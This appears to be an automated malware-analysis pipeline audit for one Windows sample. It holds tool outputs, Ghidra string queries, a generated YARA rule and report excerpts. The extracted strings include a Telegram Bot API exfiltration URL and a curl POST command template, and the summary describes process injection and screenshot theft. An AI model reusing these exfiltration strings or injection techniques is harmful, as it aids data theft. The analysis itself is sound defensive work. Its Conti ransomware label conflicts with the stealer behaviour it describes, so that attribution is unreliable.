    "0x140001440": "\u254e   ;-- WinMainCRTStartup:\n\u250c 18: entry0 ();\n\u2502       \u254e   0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; synchapi.h:136:0 ; [0x140071410:8]=0x140074090
… [5804 more chars]
```

- **upx_unpack** ok=`True` checklist=`True` — Required checklist tool (upx)

```json
{
  "upx_ok": false,
  "is_packed": false,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "upx_probe_stdout": "                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2026\nUPX 5.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 7
… [29 more chars]
```

- **xor_string_search** ok=`True` checklist=`True` — Required checklist tool (xor)

```json
{
  "xorsearch_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "candidates": [
    "Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r",
    "Found XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r"
  ],
  "xorsearch_stdout": "
… [220 more chars]
```

- **speakeasy_emulate** ok=`True` checklist=`True` — Required checklist tool (speakeasy)

```json
{
  "speakeasy_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "module_base": null,
  "entry_point": null,
  "key_events": [],
  "api_calls": [],
  "strings": []
}
```

- **frida_static_probe** ok=`True` checklist=`True` — Required checklist tool (frida_probe)

```json
{
  "frida_available": true,
  "frida_version": "17.16.4",
  "pe_probe": {
    "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "exists": true,
    "hook_candidates": [
      "KERNEL32.dll!CloseHandle",
      "KERNEL32.dll!CreateFileW",
      "KERNEL32.dll!CreateRemoteThread",
      "KERNEL32.
… [1328 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — Auto SQL seed for large-mode deep RE gate

```json
{
  "columns": [
    "name",
    "address",
    "size"
  ],
  "rows": [
    {
      "name": "__tmainCRTStartup",
      "address": "5368713280",
      "size": "980"
    },
    {
      "name": "_pei386_runtime_relocator",
      "address": "5368716480",
      "size": "887"
    },
    {
      "name": "WinMain",
      "address": "5368714576",
      "size": "727"
    },
    {
      "name": "mark_section
… [2440 more chars]
```

- **pe_import_signals** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "engine": "pe_imports",
  "sample_size": 593885,
  "duration_s": 0.05,
  "import_count": 66,
  "signal_count": 5,
  "signals": [
    {
      "label": "allocate_memory",
      "api_match": "VirtualAllocEx",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "write_process_memory",
      "api_match": "WriteProcessMemory",
      "attack": [
        "T1055"
      ]
    },
    {

… [454 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "module",
    "address"
  ],
  "rows": [
    {
      "name": "CloseHandle",
      "module": "KERNEL32.DLL",
      "address": "1"
    },
    {
      "name": "CreateFileW",
      "module": "KERNEL32.DLL",
      "address": "2"
    },
    {
      "name": "CreateRemoteThread",
      "module": "KERNEL32.DLL",
      "address": "3"
    },
    {
      "name": "CreateToolhel
… [5352 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "!This program cannot be run in DOS mode.\r\r\n$",
      "address": "5368721517",
      "length": "47"
    },
    {
      "content": "C:\\Windows\\System32\\curl.exe",
      "address": "5368836128",
      "length": "58"
    },
    {
      "content": "%s\\tmp%lu.dat",
      "address": "5368836194",
 
… [6074 more chars]
```

- **capa_analyze** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "rule_count": 17,
  "top_rules": [
    {
      "name": "encrypt data using RC4 PRGA",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Obfuscated Files or Information"
          ],
          "tactic": "Defense Evasion",
          "technique": "Obfuscated Files or Information",
          "subtechnique": "",
          "id": "T1027"
        }
      ],
 
… [6408 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "C:\\Windows\\System32\\curl.exe",
      "address": "5368836128",
      "length": "58"
    },
    {
      "content": "https://api.telegram.org/bot",
      "address": "5368836224",
      "length": "60"
    },
    {
      "content": "/sendDocument",
      "address": "5368836382",
      "length": "30"

… [5633 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "func_name",
    "func_addr",
    "size",
    "instruction_count",
    "string_ref_count"
  ],
  "rows": [
    {
      "func_name": ".text",
      "func_addr": "5368715760",
      "size": "218",
      "instruction_count": "49",
      "string_ref_count": "9"
    },
    {
      "func_name": "WinMain",
      "func_addr": "5368714576",
      "size": "727",
      "instruction_count
… [1209 more chars]
```

- **ghidra_decompile** ok=`False` checklist=`False` — langgraph tool call
  - error: `session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json`

```json
{
  "error": "session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json"
}
```

- **ghidra_decompile** ok=`False` checklist=`False` — langgraph tool call
  - error: `session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json`

```json
{
  "error": "session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "https://api.telegram.org/bot",
      "address": "5368836224",
      "length": "60"
    },
    {
      "content": "/sendDocument",
      "address": "5368836382",
      "length": "30"
    },
    {
      "content": "\"%s\" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F 
… [5535 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "image/jpeg",
      "address": "5368836822",
      "length": "22"
    },
    {
      "content": "N7Gdiplus11GdiplusBaseE",
      "address": "5368847456",
      "length": "24"
    },
    {
      "content": "N7Gdiplus5ImageE",
      "address": "5368847488",
      "length": "20"
    },
    {
      "con
… [5383 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "module"
  ],
  "rows": [
    {
      "name": "CloseHandle",
      "module": "KERNEL32.DLL"
    },
    {
      "name": "CreateFileW",
      "module": "KERNEL32.DLL"
    },
    {
      "name": "CreateRemoteThread",
      "module": "KERNEL32.DLL"
    },
    {
      "name": "CreateToolhelp32Snapshot",
      "module": "KERNEL32.DLL"
    },
    {
      "name": "DeleteFi
… [1351 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "global constructors keyed to ",
      "address": "5368838363",
      "length": "30"
    },
    {
      "content": "global destructors keyed to ",
      "address": "5368838393",
      "length": "29"
    },
    {
      "content": "_GdipFontFamilyCachedGenericMonospace",
      "address": "5368859178",
… [3982 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "!This program cannot be run in DOS mode.\r\r\n$",
      "address": "5368721517",
      "length": "47"
    },
    {
      "content": ".rdata",
      "address": "5368721912",
      "length": "8"
    },
    {
      "content": ".edata",
      "address": "5368722072",
      "length": "8"
    },
    {
  
… [5163 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "C:\\Windows\\System32\\curl.exe",
      "address": "5368836128",
      "length": "58"
    },
    {
      "content": "non-virtual thunk to ",
      "address": "5368838012",
      "length": "22"
    },
    {
      "content": "virtual thunk to ",
      "address": "5368838034",
      "length": "18"
   
… [6341 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "func_name",
    "func_addr",
    "size",
    "instruction_count",
    "call_out_count",
    "string_ref_count"
  ],
  "rows": [
    {
      "func_name": "__tmainCRTStartup",
      "func_addr": "5368713280",
      "size": "980",
      "instruction_count": "222",
      "call_out_count": "32",
      "string_ref_count": "0"
    },
    {
      "func_name": "_pei386_runtime_relocat
… [1432 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "https://api.telegram.org/bot",
      "address": "5368836224",
      "length": "60"
    },
    {
      "content": "hStdInput",
      "address": "5369220722",
      "length": "10"
    }
  ],
  "row_count": 2,
  "total_row_count": 2,
  "truncated": false,
  "source": "ghidra_query",
  "session_id": "g
… [190 more chars]
```

- **ghidra_query** ok=`False` checklist=`False` — langgraph tool call
  - error: `ghidrasql SQL error: no such column: from_func_name`

```json
{
  "error": "ghidrasql SQL error: no such column: from_func_name"
}
```

- **ghidra_query** ok=`False` checklist=`False` — langgraph tool call
  - error: `ghidrasql SQL error: no such column: from_func_addr`

```json
{
  "error": "ghidrasql SQL error: no such column: from_func_addr"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "d_pack_length",
      "address": "5369150936",
      "length": "14"
    },
    {
      "content": "d_find_pack",
      "address": "5369151067",
      "length": "12"
    }
  ],
  "row_count": 2,
  "total_row_count": 2,
  "truncated": false,
  "source": "ghidra_query",
  "session_id": "ghidra-pe-28ea
… [177 more chars]
```

### Artifact paths (verify on disk)

- **tools_raw:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/01-tools-raw.json` exists=`True` bytes=`108815` mtime=`2026-08-08T02:30:19.491480+00:00`
  - sha256: `94762af27e781e43bd4409173c41a4e3355b44720e9fc46f5f47ec7cad54c0e6`
- **sql_evidence:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/00-sql-evidence.json` exists=`False` bytes=`0` mtime=`None`
- **prompt:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/03-prompt.txt` exists=`False` bytes=`0` mtime=`None`
- **llm_raw:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/04-llm-raw.json` exists=`False` bytes=`0` mtime=`None`
- **deep05:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/05-deep-dive.json` exists=`True` bytes=`4586` mtime=`2026-08-08T02:31:38.161848+00:00`
  - sha256: `a146fd3f4db4fd61b85e7d99f56cfd0e2e78ea5aea977a251dc51111dc86173c`

#### prompt_excerpt

```

```


#### llm_raw_excerpt

```
{}
```


#### deep05_excerpt

```
{
  "source": "deep_dive_agentic",
  "engine": "langgraph",
  "verdict": "malicious",
  "confidence": 90,
  "summary": "64-bit Windows GUI PE with overlay and SEH. Static and behavioral evidence shows it is an info-stealer/surveillance implant: it uses process injection APIs (CreateRemoteThread, WriteProcessMemory, VirtualAllocEx, VirtualProtect), captures screenshots via GDI/GdiPlus (GdiplusStartup/Shutdown, ImageFormatJPEG, CreateCompatibleBitmap/DC, SelectObject, ReleaseDC), stages data in temp files (%s\\tmp%lu.dat), exfiltrates via Telegram Bot API (https://api.telegram.org/bot/sendDocument) through a SOCKS5 proxy, enforces single instance with Global\\BeaconMutex_12345, employs RC4 encryption, contains an embedded PE payload, and shows anti-analysis/anti-debugging traits. YARA rules 
… [3786 more chars]
```

- **agentic:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/agentic_deep_dive.json` exists=`True` bytes=`423955` mtime=`2026-08-08T02:31:38.160848+00:00`
  - sha256: `71caefb15995fde6f6d50c1dfff8c1cb0952f614bb878cb5cb6d408db183eb40`

---

## Stage: yara_gen

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| rule_yar | `True` |
| non_empty | `True` |
| has_rule_block | `True` |
| rule_compiles | `True` |
| rule_check | `ok` |
| meta_yara_valid | `True` |

### Artifact paths (verify on disk)

- **rule_yar:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/rule.yar` exists=`True` bytes=`2199` mtime=`2026-08-08T02:37:56.526953+00:00`
  - sha256: `bb52e2949d442c70a898c99ffcc5a6dfec0a5cf66dc2881c671e3c0b5da62f05`

#### excerpt

```
// yara_gen_v2.py — 2026-08-08T02:37:56.527350+00:00
rule CADRE_v2_unknown_28ea44a49cb4 {
    meta:
        description = "RevAI v2 auto rule for unknown"
        sha256 = "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9"
        family = "unknown"
        revai = true
        revai_commit = "80c92a39d67f7e321883d3656b87cc4b04c5b7b5"
        revai_engine = "langgraph"
        severity = "high"
        confidence = "medium"
    strings:
        $s0 = "_ZNK10__cxxabiv120__si_class_type_info12__do_dyncastExNS_17__class_type_info10__sub_kindEPKS1_PKvS4_S6_RNS1_16__dyncast_resultE" ascii wide
        $s1 = ".xdata$_ZNK10__cxxabiv117__class_type_info12__do_dyncastExNS0_10__sub_kindEPKS0_PKvS3_S5_RNS0_16__dyncast_resultE" ascii wide
        $s2 = ".pdata$_ZNK10__cxxabiv117__class
… [1397 more chars]
```


---

## Stage: publish

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| REPORT_MASTER_v2 | `True` |
| REPORT_MASTER_v3 | `True` |
| REPORT_v2 | `True` |
| REPORT_TECHNICAL_v2 | `True` |
| REPORT_TECHNICAL_v3 | `True` |
| v2_min_chars | `True` |
| v3_min_chars | `True` |
| v2_heads | `True` |
| v3_heads | `True` |
| v2_fresh_vs_deep | `True` |
| v3_fresh_vs_deep | `True` |
| not_llm_env_failure_v2 | `True` |
| not_llm_env_failure_v3 | `True` |
| v2_no_missing_sections | `True` |
| verdict_lock_ok | `True` |
| quality_pack_ok | `True` |
| master_source_llm | `True` |
| tech2_source_llm | `True` |
| tech3_source_ok | `True` |
| tech2_no_stubs | `True` |
| no_tech2_fallback | `True` |
| quality_issues | `[]` |
| engine_citation_ok | `True` |

### Artifact paths (verify on disk)

- **REPORT_MASTER_v2:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-MASTER-v2.md` exists=`True` bytes=`23677` mtime=`2026-08-08T02:39:31.351954+00:00`
  - sha256: `181ec5756cba606b689497d618c4f76d8632dcead0291f1df4e9bb63ac2d4939`
- **REPORT_MASTER_v3:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-MASTER-v3.md` exists=`True` bytes=`53279` mtime=`2026-08-08T02:47:36.445160+00:00`
  - sha256: `ca469d8bfa7e8a3bc3d2563f8ceb9be1fed84af7716b554cad0080722233e610`
- **REPORT_v2:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-v2.md` exists=`True` bytes=`23677` mtime=`2026-08-08T02:39:31.351954+00:00`
  - sha256: `181ec5756cba606b689497d618c4f76d8632dcead0291f1df4e9bb63ac2d4939`
- **REPORT_TECHNICAL_v2:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-TECHNICAL-v2.md` exists=`True` bytes=`85883` mtime=`2026-08-08T02:42:27.497956+00:00`
  - sha256: `03e8176dac25dc726e5456821f7280d34eac9ad7c4e38e21e15e730b15f49656`
- **REPORT_TECHNICAL_v3:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-TECHNICAL-v3.md` exists=`True` bytes=`70611` mtime=`2026-08-08T02:50:03.276477+00:00`
  - sha256: `d9ad8c5ccc93c88f4d89f8ec6c4d188c138115ed8f1a877e3491f89a9ccd1d8a`
- **report_v2_json:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/report-v2.json` exists=`True` bytes=`49687` mtime=`2026-08-08T02:42:27.502956+00:00`
  - sha256: `d80545cb527f3837c5481d21ccd3b41ae7138dda4a47b0209e2630127aee9cdc`

#### v2_excerpt

```
> **RevAI provenance** — commit `80c92a39d67f7e321883d3656b87cc4b04c5b7b5` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-08 02:39:31 UTC

# Classification (multi-source — V5.12)

| Source | Verdict |
|--------|--------|
| **Final (locked)** | **malicious** |
| Triage upstream (quick ∪ deep) | malicious |
| Quick scan | Malicious |
| Deep dive | malicious |
| Publish LLM (claimed) | benign |

- **Lock reason:** publish LLM claimed `benign` but upstream triage is `malicious` (YARA / tool-backed: spyeye, IsPE64, IsWindowsGUI, HasOverlay, SEH__v4, inject_thread, screenshot, win_mutex). Final verdict follows triage; dual-use branding does not clear the sample.
- **Family (triage):** Conti ransomware
- **Honesty:** the publish narrative below is **preserved unedited** so analysts can see what the report LLM argued. It i
… [22768 more chars]
```


#### v3_excerpt

```
> **RevAI provenance** — commit `80c92a39d67f7e321883d3656b87cc4b04c5b7b5` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-08 02:47:36 UTC

# RE Report — 28ea44a49cb4
_Generated 2026-08-08T02:47:36.437424+00:00_  
_Pipeline: section-based Map-Reduce, 3 pass-1 LLM calls + 14 pass-2 calls with cross-section context + 2 local sections_

<!-- section: Executive Summary | pass=2 | evidence=243c | cross_refs=True | llm_ok=True | runtime=47.65s -->

## Executive Summary
The analyzed 64-bit Windows Portable Executable (PE) sample with SHA256 hash `28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9` is confirmed malicious, with 90% confidence attribution to the Conti ransomware family (source: deep_dive_agentic, cross-section:classification). This verdict is supported by converging evidence from 12 active YARA 
… [52366 more chars]
```


---

## Manual verification checklist (public showcase)

1. Open every **Artifact path** and confirm bytes/mtime/sha256 match this report.
2. For each tool: confirm raw excerpt matches on-disk JSON (`01-tools-raw.json`).
3. For each LLM stage: `key_evidence` strings appear in tool/SQL JSON (citation grounding).
4. Confirm REPORT-MASTER-v2 **and** REPORT-MASTER-v3 are fresh vs deep_dive mtime.
5. If capa salvaged: malcat `capa_summary` exists and LLM cited it.
6. Showcase pack under `/opt/samples/logs/_showcase_audits/<sha>/` is complete.
